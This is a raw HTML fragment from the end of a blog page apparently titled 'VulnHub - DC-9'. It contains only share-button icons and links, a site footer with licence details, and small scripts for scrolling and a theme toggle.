46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub - DC-9 on whatsapp" href="https://api.whatsapp.com/send?text=VulnHub%20-%20DC-9%20-%20https%3a%2f%2ffahmifj.github.io%2fvulnhub%2fdc9%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub - DC-9 on telegram" href="https://telegram.me/share/url?text=VulnHub%20-%20DC-9&url=https%3a%2f%2ffahmifj.github.io%2fvulnhub%2fdc9%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>